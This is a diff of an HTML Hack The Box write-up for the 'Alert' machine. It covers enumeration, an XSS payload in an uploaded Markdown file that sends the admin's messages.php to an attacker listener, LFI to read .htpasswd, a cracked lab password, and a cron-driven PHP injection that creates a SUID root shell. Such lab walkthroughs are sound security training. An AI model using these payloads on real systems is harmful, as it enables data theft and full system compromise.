@@ -1,174 +1,409 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Alert &mdash; HTB Writeup</title>
-    <link rel="stylesheet" href="/style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Alert &mdash; HTB Writeup</title>
+<style>
+  :root {
+    --bg: #f7f7f9;
+    --fg: #1d1d1f;
+    --muted: #5a5a5f;
+    --card: #ffffff;
+    --border: #e2e2e6;
+    --code-bg: #f0f0f3;
+    --accent: #7c3aed;
+    --link: #5b21b6;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #121214;
+      --fg: #eaeaec;
+      --muted: #a0a0a6;
+      --card: #1b1b1e;
+      --border: #2d2d31;
+      --code-bg: #0f0f11;
+      --accent: #a78bfa;
+      --link: #c4b5fd;
+    }
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--fg);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.65;
+  }
+  .wrap {
+    max-width: 760px;
+    margin: 0 auto;
+    padding: 2rem 1.25rem 4rem;
+  }
+  header.page-header {
+    display: flex;
+    align-items: center;
+    gap: 1.25rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 1.5rem;
+    margin-bottom: 1.5rem;
+    flex-wrap: wrap;
+  }
+  header.page-header img.machine-icon {
+    width: 96px;
+    height: 96px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+  header.page-header .meta h1 {
+    margin: 0 0 0.35rem;
+    font-size: 1.9rem;
+  }
+  header.page-header .meta .tags {
+    display: flex;
+    gap: 0.5rem;
+    flex-wrap: wrap;
+    margin-top: 0.5rem;
+  }
+  .badge {
+    display: inline-block;
+    font-size: 0.78rem;
+    padding: 0.2rem 0.6rem;
+    border-radius: 999px;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--muted);
+  }
+  .badge.difficulty-easy { color: #2e7d32; border-color: #2e7d3255; }
+  @media (prefers-color-scheme: dark) {
+    .badge.difficulty-easy { color: #81c995; }
+  }
+  nav.toc {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1rem 1.25rem;
+    margin-bottom: 2rem;
+  }
+  nav.toc h2 {
+    margin-top: 0;
+    font-size: 1rem;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+    color: var(--muted);
+  }
+  nav.toc ul {
+    margin: 0;
+    padding-left: 1.1rem;
+  }
+  nav.toc li { margin: 0.25rem 0; }
+  nav.toc a { color: var(--link); text-decoration: none; }
+  nav.toc a:hover { text-decoration: underline; }
+  h1, h2, h3 { line-height: 1.3; }
+  h2 {
+    margin-top: 2.5rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 0.3rem;
+  }
+  a { color: var(--link); }
+  p { margin: 1rem 0; }
+  code {
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    background: var(--code-bg);
+    padding: 0.15rem 0.4rem;
+    border-radius: 5px;
+    font-size: 0.9em;
+  }
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem;
+    overflow-x: auto;
+  }
+  pre code {
+    background: none;
+    padding: 0;
+    font-size: 0.88rem;
+  }
+  img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+    display: block;
+    margin: 1.25rem 0;
+  }
+  figure {
+    margin: 1.5rem 0;
+  }
+  figcaption {
+    font-size: 0.85rem;
+    color: var(--muted);
+    text-align: center;
+    margin-top: 0.4rem;
+  }
+  blockquote.callout {
+    border-left: 4px solid var(--accent);
+    background: var(--card);
+    border-radius: 0 8px 8px 0;
+    padding: 0.75rem 1rem;
+    margin: 1.25rem 0;
+  }
+  blockquote.callout .callout-title {
+    font-weight: 600;
+    margin-bottom: 0.3rem;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.25rem 0;
+  }
+  th, td {
+    border: 1px solid var(--border);
+    padding: 0.5rem 0.75rem;
+    text-align: left;
+  }
+  th { background: var(--code-bg); }
+  footer {
+    margin-top: 3rem;
+    padding-top: 1rem;
+    border-top: 1px solid var(--border);
+    color: var(--muted);
+    font-size: 0.85rem;
+  }
+
+  :root { --user: #2563eb; --pass: #dc2626; }
+  @media (prefers-color-scheme: dark) {
+    :root { --user: #60a5fa; --pass: #f87171; }
+  }
+  /* Inline commands, paths and filenames: terminal look */
+  code {
+    display: inline;
+    background: #0b0f0b;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 5px;
+    padding: 0.1rem 0.4rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88em;
+    word-break: break-word;
+  }
+  /* Commands and replies: terminal box with a Copy button */
+  .terminal-box {
+    background: #000;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 8px;
+    padding: 0.9rem 1rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88rem;
+    white-space: pre-wrap;
+    word-break: break-all;
+    overflow-wrap: break-word;
+  }
+  .terminal-wrapper { margin: 1.25rem 0; }
+  .terminal-header { display: flex; justify-content: flex-end; padding-bottom: 6px; }
+  .copy-btn {
+    font-size: 11px;
+    padding: 4px 10px;
+    border-radius: 4px;
+    cursor: pointer;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--link);
+  }
+  .copy-btn:hover { background: var(--accent); color: var(--bg); }
+  /* Credentials and flags: labelled boxes */
+  fieldset.cred-box, fieldset.flag-box {
+    border: 1px solid var(--border);
+    border-left: 4px solid var(--accent);
+    border-radius: 8px;
+    padding: 0.6rem 1rem 0.9rem;
+    margin: 1.25rem 0;
+    background: var(--card);
+  }
+  fieldset legend {
+    padding: 0 0.4rem;
+    font-size: 0.8rem;
+    font-weight: 600;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    color: var(--accent);
+  }
+  fieldset.flag-box {
+    background: #000;
+    border-color: #1f2a1f;
+    border-left: 4px solid #39ff14;
+    color: #39ff14;
+  }
+  fieldset.flag-box legend { color: #39ff14; }
+  fieldset.flag-box code { background: none; border: none; padding: 0; color: inherit; }
+  /* Usernames and passwords */
+  .user { color: var(--user); font-weight: 600; }
+  .pass { color: var(--pass); font-weight: 600; }
+  code .user { color: #60a5fa; }
+  code .pass { color: #f87171; }
+</style>
 </head>
 <body>
-    <main class="main-content">
-        <div class="content-card">
-<div class="writeup-content">
-    <div style="text-align: center;">
-        <h1>Hack The Box</h1>
-        <h2>Alert</h2>
-        <img src="/pngs/HTB/Easy/Alert/Alert.png" alt="Alert Banner" style="border:none; width: 300px; margin-bottom: 20px;">
-        <h3 style="color: #3fb950;">Level: Easy</h3>
+<div class="wrap">
+
+<header class="page-header">
+  <img class="machine-icon" src="/pngs/HTB/Easy/Alert/Alert.png" alt="Alert machine icon from Hack The Box" loading="lazy">
+  <div class="meta">
+    <h1>Alert</h1>
+    <div class="tags">
+      <span class="badge">Hack The Box</span>
+      <span class="badge">Linux</span>
+      <span class="badge difficulty-easy">Easy</span>
     </div>
+  </div>
+</header>
 
-    <h3 class="step-header">1. Enumeration</h3>
-    <p>I started with port enumeration:</p>
-    <div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.10.11.44</div>
-    
-    <ul>
-        <li><strong>-p- --open</strong>: Scans all ports and shows open ones.</li>
-        <li><strong>-sS</strong>: SYN stealth scan.</li>
-        <li><strong>-vvv</strong>: Maximum verbosity for real-time results.</li>
-    </ul>
+<nav class="toc">
+  <h2>Contents</h2>
+  <ul>
+    <li><a href="#enumeration">1. Enumeration</a></li>
+    <li><a href="#web-exploitation">2. Web Exploitation</a></li>
+    <li><a href="#initial-access">3. Initial Access</a></li>
+    <li><a href="#privilege-escalation">4. Privilege Escalation</a></li>
+  </ul>
+</nav>
 
-    <p>Ports 22 (SSH) and 80 (HTTP) are open. Service scan:</p>
-    <div class="terminal-box">nmap -sC -sV -p22,80 10.10.11.44</div>
-        
-    <ul>
-        <li><strong>-sC</strong>: Runs default scripts.</li>
-        <li><strong>-sV</strong>: Enumerates for the version running.</li>
-    </ul>
+<h2 id="enumeration">1. Enumeration</h2>
+<p>I started with port enumeration:</p>
+<div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.10.11.44</div>
+<ul>
+  <li><strong>-p- --open</strong>: Scans all ports and shows open ones.</li>
+  <li><strong>-sS</strong>: SYN stealth scan.</li>
+  <li><strong>-vvv</strong>: Maximum verbosity for real-time results.</li>
+</ul>
 
-    <p>The domain is <code>alert.htb</code>. I updated my <code>/etc/hosts</code>: <p></p>
+<p>Ports 22 (SSH) and 80 (HTTP) are open. Service scan:</p>
+<div class="terminal-box">nmap -sC -sV -p22,80 10.10.11.44</div>
+<ul>
+  <li><strong>-sC</strong>: Runs default scripts.</li>
+  <li><strong>-sV</strong>: Enumerates for the version running.</li>
+</ul>
 
-    <div class="terminal-box">echo "10.10.10.11 alert.htb" | sudo tee -a /etc/hosts</div>
-        
-    <p>Next step is vhost enumeration:</p>
+<p>The domain is <code>alert.htb</code>. I updated my <code>/etc/hosts</code>:</p>
+<div class="terminal-box">echo "10.10.10.11 alert.htb" | sudo tee -a /etc/hosts</div>
 
-    <div class="terminal-box">ffuf -w ~/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://alert.htb/ -H 'Host: FUZZ.alert.htb' -fl 10</div>
+<p>Next step is vhost enumeration:</p>
+<div class="terminal-box">ffuf -w ~/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://alert.htb/ -H 'Host: FUZZ.alert.htb' -fl 10</div>
+<ul>
+  <li><strong>-w ~/path/to/subdomain.txt</strong>: The wordlist used to start the fuzzing.</li>
+  <li><strong>-fl</strong>: Exclude responses with a specific number of lines or range of lines.</li>
+</ul>
 
-      <ul>
-        <li><strong>-w ~/path/to/subdomain.txt</strong>: This is the wordlist that is used to start the fuzzing.</li>
-        <li><strong>-fl</strong>: Exclude responses with a specific number of lines or range of lines.</li>
-    </ul>
-    
-    <p>Found a subdomain named <code>statistics</code>  but requires authentication.So I moved back to the main page.</p>
+<p>Found a subdomain named <code>statistics</code>, but it requires authentication. So I moved back to the main page.</p>
 
-    <h3 class="step-header">2. Web Exploitation (XSS to LFI)</h3>
-    <p>On the main site, the "Markdown Viewer" allows uploading <code>.md</code> files.</p>
+<h2 id="web-exploitation">2. Web Exploitation (XSS to LFI)</h2>
+<p>On the main site, the "Markdown Viewer" allows uploading <code>.md</code> files.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523185001.png" alt="Markdown Viewer upload page" loading="lazy">
+</figure>
 
-    <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523185001.png"> 
+<p>When I visited the "About Us" page I could see this message:</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190321.png" alt="About Us page message" loading="lazy">
+</figure>
 
-    <p>When I visited the "About Us" page I could see this message:</p>
+<p>The administrator checks the contact messages at "Contact us".</p>
 
-    <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190321.png">
+<p>So step by step we check our tabs. First we will check the uploading tab "Markdown Viewer".</p>
+<p>I sent a <code>.md</code> file which I created. Next I got redirected and the contents of the file were displayed.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190634.png" alt="Markdown Viewer showing the uploaded file" loading="lazy">
+</figure>
 
-    <p>The administrator checks the contact messages at "Contact us".</p>
-
-    <p> So step by step we check our tabs.
-        First we will check the uploading tab "Markdown Viewer".</p>
-    <p>I sent a <code>.md</code> file which I created. Next I got redirected and the contents of the file were displayed.</p>
-
-    <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190634.png">
-
-    
-    <p>This way I discovered it was vulnerable to XSS. I crafted a payload to leak <code>messages.php</code></p> via the administrator's session:</p>
-
-    <div class="terminal-box">&lt;script&gt;
+<p>This way I discovered it was vulnerable to XSS. I crafted a payload to leak <code>messages.php</code> via the administrator's session:</p>
+<div class="terminal-box">&lt;script&gt;
 fetch('http://alert.htb/messages.php')
-.then(resp => resp.text())
-.then(body => {
+.then(resp =&gt; resp.text())
+.then(body =&gt; {
     fetch("http://10.10.14.22:9200/exfil?body=" + btoa(body));
 })
 &lt;/script&gt;</div>
+<ul>
+  <li><strong>fetch('http://alert.htb/messages.php')</strong>: Makes an HTTP GET request to that page and retrieves its content.</li>
+  <li><strong>.then(resp =&gt; resp.text())</strong>: Converts the response to plain text instead of JSON or binary, so <code>body</code> holds the full HTML/text content of the page.</li>
+  <li><strong>btoa(body)</strong>: Encodes the content with Base64, so it can be safely included in a URL.</li>
+  <li><strong>exfil?body=...</strong>: Sends the data to our listener, which leaks the content of <code>messages.php</code>.</li>
+</ul>
 
-    <ul>
-        <li><strong>fetch('http://alert.htb/messages.php')</strong>:</li>
-            <ul>
-                <li>This line makes an HTTP GET request to 'http://alert.htb/messages.php'.</li>
-                <li>It's attempting to retrieve the content of that page.</li>
-            </ul>
-        <li><strong>.then(resp => resp.text())</strong>: Exclude responses with a specific number of lines or range of lines.</li>
-         <ul>
-                <li>It processes the response and converts it to plain text 'resp.text()', instead of JSON or binary.</li>
-                <li>'body' will now contain the full HTML/text content returned by the page.</li>
-            </ul>
-        <li><strong>.then(body => { ... })</strong>: In this block, it takes the text content 'body'.</li>
-        <li><strong>fetch("http://10.10.14.22:9200/exfil?body="</strong>: In this block, it takes the text content 'body'.</li>
-        <ul>
-        <li><strong> + btoa(body))</strong>: It encodes the content using 'btoa(body)' (Base64 encoding), so it can be safely included in a URL.</li>
-        <li><strong>http://10.10.14.22:9200/</strong>: Next it sends this data to a remote server.</li>
-        <li><strong>exfil?body=...</strong>: This is the exfiltration part — it leaks the content of `messages.php` to our listener.
-        </ul>
-    </ul>
+<p>Before continuing I checked the "visualizer.php" file. I read the source code with <code>CTRL+U</code> and found out that the uploaded file was saved with a different name.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523185209.png" alt="Source code showing the saved file name" loading="lazy">
+</figure>
 
+<p>I found out that "Contact Us" has a form that I could fill in.</p>
+<p>I set a listener and tried to see if there was any response.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190044.png" alt="Listener waiting for a response" loading="lazy">
+</figure>
+<figure>
+  <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190108.png" alt="Response to the contact form" loading="lazy">
+</figure>
 
-    <p>Before continuing I checked the "visualizer.php" file.I read the source code <code>CTRL+U</code> and found out that the uploaded file was saved with a different name.</p>
+<p>Combining all the above, I uploaded the script discussed above as <code>payload.md</code>, opened a listener, and copied the link from the source code:</p>
+<div class="terminal-box">http://alert.htb/visualizer.php?link_share=6830997ae06754.83998933.md</div>
+<p>The admin will check the link. This triggers the uploaded file and sends me the contents of <code>messages.php</code> from the admin's view.</p>
 
-    <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523185209.png">
+<p>Decoding the data revealed a hidden file path:</p>
+<div class="terminal-box">echo "PGgxPk1lc3NhZ2VzPC9oMT4..." | base64 -d</div>
 
-    <p>I found out that at "Contact Us" there was a form that I could fill</p> 
-    <p>I set a listener and tried to see if there was any response.</p>
+<h2 id="initial-access">3. Initial Access</h2>
+<p>After I read the <code>.txt</code> file, I used the LFI vulnerability and read the default Apache configuration file.</p>
+<p>It was revealed that the <code>.htpasswd</code> file has credentials for the statistics subdomain:</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523195535.png" alt=".htpasswd file contents" loading="lazy">
+</figure>
+<div class="terminal-box">albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</div>
 
-    <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190044.png">
+<p>Cracked the hash using <code>hashcat</code>:</p>
+<fieldset class="cred-box">
+  <legend>Credentials</legend>
+  <code><span class="user">albert</span> : <span class="pass">manchesterunited</span></code>
+</fieldset>
 
-    
-    <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523190108.png">
-
-    <p>Combining all the above I uploaded the script discussed as <code>payload.md</code>, opened a listener and copy-pasted the link from source code.</p>
-        <code>http://alert.htb/visualizer.php?link_share=6830997ae06754.83998933.md</code>
-    <p>The admin will check the link and this will trigger the uploaded file and will send me the contents of <code>messages.php</code> from the view of admin.</p>
-
-    <p>Decoding the data revealed a hidden file path:</p>
-    <div class="terminal-box">echo "PGgxPk1lc3NhZ2VzPC9oMT4..." | base64 -d</div>
-
-    <h3 class="step-header">3. Initial Access</h3>
-    <p>After I read the <code>.txt</code> file, I used the LFI vulnerability and I read the default Apache configuration file</p>
-    <p>It was revealed that  <code>.htpasswd</code> file has credentials for the statistics subdomain:</p>
-    
-    <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250523195535.png">
-
-    
-    <div class="terminal-box">albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</div>
-
-    <p>Cracked the hash using <code>hashcat</code>:</p>
-    <fieldset class="cred-box">
-        <legend>Credentials</legend>
-        <code>albert:manchesterunited</code>
-    </fieldset>
 <p>I connected via SSH and found the user flag.</p>
-    <fieldset class="root-box">
-        <legend>User Flag</legend>
-        <code>5e08a222ac9809e502410937ed....</code>
-    </fieldset>
-</div>
-    
-    <h3 class="step-header">4. Privilege Escalation</h3>
-    <p>Using the <code>id</code> command, Albert is part of the <code>management</code> group. I found a writable configuration file used by a root cronjob:</p>
-    <div class="terminal-box">find / -group management 2>/dev/null</div>
+<fieldset class="flag-box">
+  <legend>User Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
 
-    <p>I injected a command into <code>/opt/website-monitor/config/configuration.php</code> to create a SUID bash binary:</p>
-    <div class="terminal-box">&lt;?php 
-define('PATH', '/opt/website-monitor'); 
-system('cp /bin/bash /tmp/damn; chown root:root /tmp/damn; chmod 6777 /tmp/damn;'); 
+<h2 id="privilege-escalation">4. Privilege Escalation</h2>
+<p>Using the <code>id</code> command, I saw that Albert is part of the <code>management</code> group. I found a writable configuration file used by a root cronjob:</p>
+<div class="terminal-box">find / -group management 2&gt;/dev/null</div>
+
+<p>I injected a command into <code>/opt/website-monitor/config/configuration.php</code> to create a SUID bash binary:</p>
+<div class="terminal-box">&lt;?php
+define('PATH', '/opt/website-monitor');
+system('cp /bin/bash /tmp/damn; chown root:root /tmp/damn; chmod 6777 /tmp/damn;');
 ?&gt;</div>
+<ul>
+  <li><strong>system</strong>: Runs the command inside the PHP file.</li>
+  <li><strong>cp /bin/bash /tmp/damn</strong>: Copies the Bash shell to a temporary folder and renames it <code>damn</code>.</li>
+  <li><strong>chown root:root /tmp/damn</strong>: Changes the owner of that file to root.</li>
+  <li><strong>chmod 6777 /tmp/damn</strong>: Sets the SUID bit and full access permissions for everyone.</li>
+</ul>
 
- <ul>
-        <li><strong>system</strong>: It encodes the content using 'btoa(body)' (Base64 encoding), so it can be safely included in a URL.</li>
-        <li><strong>cp /bin/bash /tmp/damn</strong></strong>: Copies the Bash shell to a temporary folder and renames it damn.</li>
-        <li><strong>chown root:root /tmp/damn</strong>: Attempts to change the owner of that file to 'root'.</li>
-        <li><strong>chmod 6777 /tmp/damn</strong>: Sets full access permissions (read/write/execute) for everyone.</li>
- </ul>
+<figure>
+  <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250525213818.png" alt="SUID binary created by the cronjob" loading="lazy">
+</figure>
 
-    <img src="/pngs/HTB/Easy/Alert/Pasted%20image%2020250525213818.png">
+<p>After the cronjob ran, I executed the binary with <code>-p</code> to get root:</p>
+<div class="terminal-box">/tmp/damn -p</div>
 
-    <p>After the cronjob ran, I executed the binary with <code>-p</code> to get root:</p>
-    <div class="terminal-box">/tmp/damn -p</div>
+<fieldset class="flag-box">
+  <legend>Root Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
 
-    <fieldset class="root-box">
-        <legend>Root Flag</legend>
-        <code>65383dc809d3cec5c5677403436...</code>
-    </fieldset>
 </div>
-        </div>
-    </main>
-    <script src="/copy.js"></script>
-    <script src="/nav.js"></script>
+<script src="/copy.js"></script>
+<script src="/nav.js"></script>
 </body>
 </html>
